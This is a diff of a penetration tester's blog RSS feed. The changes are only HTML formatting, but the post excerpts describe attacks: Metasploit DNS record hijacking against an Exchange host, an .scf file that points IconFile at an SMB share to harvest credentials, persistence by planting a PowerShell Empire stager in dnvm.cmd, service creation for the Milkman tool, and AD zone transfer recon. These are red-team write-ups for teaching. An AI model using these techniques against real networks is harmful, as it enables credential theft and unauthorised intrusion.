@@ -24,12 +24,12 @@
 &lt;center&gt; **You will break email for the entire company if you do this on a live network. Doing so is possibly a resume generating event.**&lt;/center&gt;
 &lt;center&gt;![](/images/2017/before_dns_update.png)&lt;/center&gt;
 &lt;p&gt;If you are going to be overwriting an existing record make sure to keep a note of the real IP address of the host you are overwriting so that you can fix the record afterwards.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ dig @192.168.80.10 sdexchange.sittingduck.info
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ dig @192.168.80.10 sdexchange.sittingduck.info
 
 ;; ANSWER SECTION:
 sdexchange.sittingduck.info. 1200 IN	A	192.168.80.13
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here is what the module looks like:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/admin/dns/dyn_dns_update
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/admin/dns/dyn_dns_update
 msf auxiliary(dyn_dns_update) &amp;gt; show options
 
 Module options (auxiliary/admin/dns/dyn_dns_update):
@@ -51,7 +51,7 @@ Auxiliary action:
    ----    -----------
    UPDATE  Add or update a record. (default)
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It has 3 different actions, but you&amp;rsquo;ll mostly want &lt;code&gt;UPDATE&lt;/code&gt;. &lt;code&gt;UPDATE&lt;/code&gt; will automatically delete a record if it exists already and then add the record back with your specified settings.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; show actions
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; show actions
 
 Auxiliary actions:
 
@@ -60,9 +60,8 @@ Auxiliary actions:
    ADD     Add a new record. Fail if it already exists.
    DELETE  Delete an existing record.
    UPDATE  Add or update a record. (default)
-
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here are the settings I chose. Notice the IP address that I&amp;rsquo;m injecting isn&amp;rsquo;t on the same subnet as the domain.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; set DOMAIN sittingduck.info
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; set DOMAIN sittingduck.info
 DOMAIN =&amp;gt; sittingduck.info
 msf auxiliary(dyn_dns_update) &amp;gt; set HOSTNAME sdexchange
 HOSTNAME =&amp;gt; sdexchange
@@ -71,13 +70,13 @@ IP =&amp;gt; 100.100.100.100
 msf auxiliary(dyn_dns_update) &amp;gt; set RHOST 192.168.80.10
 RHOST =&amp;gt; 192.168.80.10
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the output:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; run
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; run
 
 [+] Found existing A record for sdexchange.sittingduck.info
 [*] Sending dynamic DNS delete message...
-[+] The record &#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&#39; has been deleted!
+[+] The record &amp;#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&amp;#39; has been deleted!
 [*] Sending dynamic DNS add message...
-[+] The record &#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&#39; has been added!
+[+] The record &amp;#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&amp;#39; has been added!
 [*] Auxiliary module execution completed
 msf auxiliary(dyn_dns_update) &amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;game-over&#34;&gt;#Game Over&lt;/h2&gt;
@@ -96,10 +95,10 @@ msf auxiliary(dyn_dns_update) &amp;gt;
 &lt;p&gt;I was having one of those moments in a recent conversation on the NoVA Hackers mailing list (If you want to join &lt;a href=&#34;https://novahackers.blogspot.com/p/how-to-join-and-rules.html&#34;&gt;please read the instructions&lt;/a&gt; before &lt;a href=&#34;https://twitter.com/mubix/status/719726427785007104&#34;&gt;requesting to join&lt;/a&gt;)&lt;/p&gt;
 &lt;p&gt;The question came up as to what effect &amp;ldquo;Password Required: No&amp;rdquo; means in a &lt;code&gt;net user UserName&lt;/code&gt; is.&lt;/p&gt;
 &lt;p&gt;As usual, MSDN isn&amp;rsquo;t very helpful:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/passwordreq:{yes | no} - Specifies whether a user account must have a password. The default is yes.
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/passwordreq:{yes | no} - Specifies whether a user account must have a password. The default is yes.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;from: &lt;a href=&#34;https://technet.microsoft.com/en-us/library/cc771865%28v=ws.11%29.aspx&#34;&gt;https://technet.microsoft.com/en-us/library/cc771865%28v=ws.11%29.aspx&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;An old ISS finding wasn&amp;rsquo;t any more helpful:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;A User account has been detected with no password required. No password requirement allows attackers unauthorized access, including the ability to take over and replace processes, and access other computers on the network.
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A User account has been detected with no password required. No password requirement allows attackers unauthorized access, including the ability to take over and replace processes, and access other computers on the network.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;from: &lt;a href=&#34;http://www.iss.net/security_center/reference/vulntemp/nt-usernopw.htm&#34;&gt;http://www.iss.net/security_center/reference/vulntemp/nt-usernopw.htm&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;But they did at least provide mitigations and remediation steps.&lt;/p&gt;
 &lt;p&gt;Finally doing tests on a number of different scenarios I finally figured out what it meant in more concret terms:&lt;/p&gt;
@@ -122,27 +121,27 @@ so I went digging. Turns out they are a simple text based file that
 controls Windows Explorer. ;-)&lt;/p&gt;
 &lt;p&gt;Here are the examples I found via the references:&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Open Explorer&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[Shell] 
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[Shell] 
 Command = 2 
 IconFile = explorer.exe, 1
 [Taskbar] 
 Command = Explorer
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Open &amp;ldquo;Channels&amp;rdquo; page in IE:&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[Shell]
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[Shell]
 Command=3
 IconFile=shdocvw.dll,-118
 [IE]
 Command=Channels
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This didn&amp;rsquo;t work for me at all, probably because Internet Explorer doesn&amp;rsquo;t have &amp;ldquo;Channels&amp;rdquo; anymore.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Minimize all windows:&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[Shell]
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[Shell]
 Command=2
 IconFile=explorer.exe,3
 [Taskbar]
 Command=ToggleDesktop
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;My first attempt to utilize this file format for fun was of course
 to just set the IconFile to an SMB share:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[Shell]
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[Shell]
 Command=2
 IconFile=\\192.168.1.101\share\test.ico
 [Taskbar]
@@ -173,14 +172,14 @@ inside the file, but I assume it&amp;rsquo;s not just to minimize all windows.&l
       <guid>https://malicious.link/post/2015/dotnet-dnvm-for-persistence-on-developer-machines/</guid>
       <description>&lt;p&gt;One of the best resources for persistence mechanisms is &lt;a href=&#34;https://twitter.com/Hexacorn&#34;&gt;Hexacorn&amp;rsquo;s&lt;/a&gt; blog.
 &lt;a href=&#34;http://www.hexacorn.com/blog/category/autostart-persistence/&#34;&gt;http://www.hexacorn.com/blog/category/autostart-persistence/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;If you haven&amp;rsquo;t checked out his &amp;ldquo;Beyond good ol&#39; Run key&amp;rdquo; (linked above) 32 post series, you really should. But today I wanted to talk about one that I didn&amp;rsquo;t see up there:&lt;/p&gt;
+&lt;p&gt;If you haven&amp;rsquo;t checked out his &amp;ldquo;Beyond good ol&amp;rsquo; Run key&amp;rdquo; (linked above) 32 post series, you really should. But today I wanted to talk about one that I didn&amp;rsquo;t see up there:&lt;/p&gt;
 &lt;p&gt;DNVM (&lt;a href=&#34;https://github.com/aspnet/dnvm&#34;&gt;https://github.com/aspnet/dnvm&lt;/a&gt;) is the DotNet Version Manager and it&amp;rsquo;s a part of ASP.NET 5, which I believe has been inside of Visual Studio since the 2013 version. It&amp;rsquo;s there to help to specify which runtime to use for applications, much like &lt;a href=&#34;https://rvm.io/&#34;&gt;RVM (Ruby Version Manager)&lt;/a&gt; is for Ruby. With their goal being that you can install .Net and &lt;a href=&#34;http://docs.asp.net/en/latest/getting-started/index.html&#34;&gt;run .Net applications on Linux and Mac&lt;/a&gt; as well using DNVM.&lt;/p&gt;
 &lt;p&gt;Once installed it adds a &amp;ldquo;DNX_HOME&amp;rdquo; environmental variable:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2015/dnx_reg.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Inside the folder specified are 3 directories:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2015/dnx_folder.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;There are plenty of things to play with in here, but I wanted to specifically point out that the &lt;strong&gt;BIN&lt;/strong&gt; directory is put into the $PATH variable (as well as two others)&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;C:\WINDOWS\system32\config\systemprofile\.dnx\bin (DOES NOT EXIST BY DEFAULT)
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\WINDOWS\system32\config\systemprofile\.dnx\bin (DOES NOT EXIST BY DEFAULT)
 C:\Program Files\Microsoft DNX\Dnvm\
 C:\Users\mubix\.dnx\bin
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ok, not a big deal right? Even a user under UAC can edit their own $PATH variable (we&amp;rsquo;ll come back to that in another post)&lt;/p&gt;
@@ -191,7 +190,7 @@ C:\Users\mubix\.dnx\bin
 &lt;p&gt;Seriously&amp;hellip; I probably don&amp;rsquo;t even have to continue at this point&amp;hellip;&lt;/p&gt;
 &lt;p&gt;But, if I run dnvm from the command prompt (as a developer would) it runs it from inside that protected directory in Program Files right?&amp;hellip; RIGHT?! Nope..&lt;/p&gt;
 &lt;p&gt;Edit the dnvm.cmd with a bit of &lt;a href=&#34;http://www.powershellempire.com/&#34;&gt;PowerShell Empire&lt;/a&gt; stager (minus the &lt;strong&gt;-W Hidden&lt;/strong&gt;, because we need the user to actually get the output of the dnvm command) and&amp;hellip;.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[+] Initial agent UU2YKZ3VDG2AUKFY from 192.168.1.109 now active
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[+] Initial agent UU2YKZ3VDG2AUKFY from 192.168.1.109 now active
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Boom!&lt;/p&gt;
 &lt;p&gt;Lets look a bit into how DNVM works to see if there is something juicier there (way to much for a single blog post)&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2015/dnvm_list.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
@@ -232,7 +231,7 @@ C:\Users\mubix\.dnx\bin
 &lt;p&gt;As far as I can tell the important pieces are the Windows API calls &lt;strong&gt;ImpersonateLoggedOnUser&lt;/strong&gt;, and &lt;strong&gt;CreateProcessAsUserA&lt;/strong&gt;. I set to trying to reproduce what it did in &lt;a href=&#34;https://www.autoitscript.com/site/autoit/&#34;&gt;AutoIT (awesome stuff if you have never checked it out)&lt;/a&gt;. I couldn&amp;rsquo;t quite get the API calls right, so I decided to give C++ a shot. Turned out to be pretty simple. I present to you &amp;ldquo;Milkman&amp;rdquo;:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://gist.github.com/mubix/5d0cacdabfe092922fa3&#34;&gt;https://gist.github.com/mubix/5d0cacdabfe092922fa3&lt;/a&gt;  &lt;strong&gt;(full source included below)&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;This program (once compiled) takes one argument (or none at all) and runs calc.exe for every instance of the process you tell it to. If you run it without arguments it auto selects explorer.exe. So if you create a service:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;C:\temp\&amp;gt;sc create SuperService binpath= C:\Temp\milkman.exe type= own start= auto
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\temp\&amp;gt;sc create SuperService binpath= C:\Temp\milkman.exe type= own start= auto
 [SC] CreateService SUCCESS
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It will start up every time the computer starts, which is completely useless, since there won&amp;rsquo;t be any users logged in at that point, but you get where this can go. Features to add to this at point are:&lt;/p&gt;
 &lt;ol&gt;
@@ -251,21 +250,21 @@ C:\Users\mubix\.dnx\bin
       <pubDate>Fri, 04 Oct 2013 11:30:44 -0500</pubDate>
       
       <guid>https://malicious.link/post/2013/ad-zone-transfers-as-a-user/</guid>
-      <description>&lt;p&gt;_cross posted from: &lt;a href=&#34;http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html_&#34;&gt;http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html_&lt;/a&gt;&lt;/p&gt;
+      <description>&lt;p&gt;&lt;em&gt;cross posted from: &lt;a href=&#34;http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html&#34;&gt;http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;The tired and true method for Zone Transfers are using either nslookup:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;nslookup
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nslookup
 ls -d domain.com.local
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Or dig:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;dig -t AXFR domain.com.local @ns1.domain.com.local
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dig -t AXFR domain.com.local @ns1.domain.com.local
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the Windows Enterprise world there are a few more options. If you are a DNS Admin you can use the &amp;lsquo;dnscmd&amp;rsquo; command like so:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;dnscmd /EnumZones
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dnscmd /EnumZones
 dnscmd /ZonePrint domain.com.local
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Which is handy if you can pop the DNS server (usually the Domain Controller so you usually have better things to do at that point).&lt;/p&gt;
 &lt;p&gt;You can also use PowerShell:&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;PS C:\Users\jdoe&amp;gt; get-wmiobject -ComputerName dc1 -Namespace root\microsoftDNS -Class MicrosoftDNS_ResourceRecord -Filter &amp;quot;domainname=&#39;projectmentor.net&#39;&amp;quot; | select textrepresentation&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Again, this requires you to be a very high privileged account, which is no fun. I need these computer lists as part of my internal / post-exploitation recon, not an end step.&lt;/p&gt;
 &lt;p&gt;For the longest time I relied on a very awesome tool called &amp;ldquo;Adfind&amp;rdquo;:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;adfind -sc computers_active -csv -nodn -nocsvq -nocsvheader
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;adfind -sc computers_active -csv -nodn -nocsvq -nocsvheader
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This command will output a list of computer accounts that have been active in the last 90 days in a straight line by line format (hence all of the no &amp;ldquo;this&amp;quot;and no &amp;ldquo;that&amp;rdquo; flags)&lt;/p&gt;
 &lt;p&gt;But that wasn&amp;rsquo;t good enough, this image kept haunting me:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2013/ad-dns-zone.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
